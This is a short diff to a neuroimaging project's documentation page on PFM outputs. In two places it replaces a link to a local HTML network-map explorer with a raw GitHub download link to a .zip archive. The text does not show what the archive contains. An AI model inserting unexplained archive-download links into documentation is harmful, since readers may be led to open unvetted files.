@@ -1,6 +1,6 @@
 # PFM Outputs
 
-[See example maps and continuous representations](ridgepfm-taxonomy-explorer.html?raw=1).
+[See example maps and continuous representations](https://raw.githubusercontent.com/cjl2007/pfm-mefmri/main/docs/ridgepfm-taxonomy-explorer.zip).
 Network labels and weights can feed the [optional TANS module](tans-integration.md)
 after QC and explicit selection of the input maps and metadata.
 
@@ -341,7 +341,7 @@ PFM/Infomap/InfomapNetworkLabels_ManualAdjusted_ProbabilityConsensus.dscalar.nii
 
 ## Areal Parcellation
 
-The [network-map selector](ridgepfm-taxonomy-explorer.html?raw=1) includes an
+The [network-map selector](https://raw.githubusercontent.com/cjl2007/pfm-mefmri/main/docs/ridgepfm-taxonomy-explorer.zip) includes an
 **Areal parcellation** checkbox. Each example taxonomy has its own FC-derived
 parcels, computed downstream of its vertex-wise WTA map with the existing areal
 stage (including its WTA cleanup). The toggle loads those precomputed results;
